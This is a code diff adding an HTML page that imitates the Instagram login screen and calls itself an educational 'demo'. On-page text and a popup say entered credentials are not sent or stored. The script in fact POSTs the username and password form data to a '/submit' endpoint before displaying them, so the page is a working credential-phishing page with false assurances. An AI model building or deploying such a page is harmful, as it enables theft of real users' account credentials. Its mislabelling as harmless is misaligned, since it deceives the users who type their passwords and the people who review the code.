@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #fff;
+        }
+        .login-box {
+            text-align: center;
+            padding: 20px;
+        }
+        .login-box h1 {
+            font-family: 'Grand Hotel', cursive;
+            font-size: 45px;
+            margin-bottom: 20px;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #262626;
+            background-color: #262626;
+            color: #fff;
+            border-radius: 3px;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            color: #fff;
+            border-radius: 5px;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+        .login-box .or {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 10px 0;
+        }
+        .login-box .or hr {
+            flex-grow: 1;
+            border: none;
+            border-top: 1px solid #fff;
+            margin: 0 10px;
+        }
+        .login-box .facebook {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0095f6;
+            margin: 10px 0;
+        }
+        .login-box a {
+            color: #0095f6;
+            text-decoration: none;
+            margin: 10px 0;
+            display: block;
+        }
+        .login-box .app-links {
+            margin-top: 20px;
+        }
+        .login-box .app-links img {
+            width: 120px;
+            margin: 0 5px;
+        }
+        #demoPopup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #000;
+            padding: 20px;
+            border: 1px solid #fff;
+            color: #fff;
+            text-align: left;
+            z-index: 1000;
+        }
+        #closePopup {
+            float: right;
+            cursor: pointer;
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>Instagram</h1>
+        <form id="loginForm">
+            <input type="text" name="username" placeholder="Phone number, username or email address" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log in</button>
+        </form>
+        <div class="or">
+            <hr><span>OR</span><hr>
+        </div>
+        <div class="facebook">Log in with Facebook</div>
+        <a href="#">Forgot password? Reset</a>
+        <a href="#">Don't have an account? Sign up</a>
+        <div class="app-links">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/Microsoft_Store_Badge.svg" alt="Microsoft Store">
+        </div>
+        <p>Demo only — this page does not send or store credentials.</p>
+    </div>
+
+    <div id="demoPopup">
+        <span id="closePopup">&times;</span>
+        <h3>Demo submission intercepted</h3>
+        <p>This is a local, view-only educational demo. Entered values are shown here for demonstration and not transmitted.</p>
+        <p><strong>Username:</strong> <span id="demoUsername"></span></p>
+        <p><strong>Password:</strong> <span id="demoPassword"></span></p>
+        <p>No data is saved or sent anywhere.</p>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const form = this;
+            fetch('/submit', {
+                method: 'POST',
+                body: new FormData(form)
+            })
+            .then(response => response.text())
+            .then(data => {
+                const username = form.querySelector('input[name="username"]').value;
+                const password = form.querySelector('input[name="password"]').value;
+                document.getElementById('demoUsername').textContent = username;
+                document.getElementById('demoPassword').textContent = password;
+                document.getElementById('demoPopup').style.display = 'block';
+                console.log(data);
+            })
+            .catch(error => console.error('Error:', error));
+        });
+
+        document.getElementById('closePopup').addEventListener('click', function() {
+            document.getElementById('demoPopup').style.display = 'none';
+        });
+    </script>
+</body>
+</html>
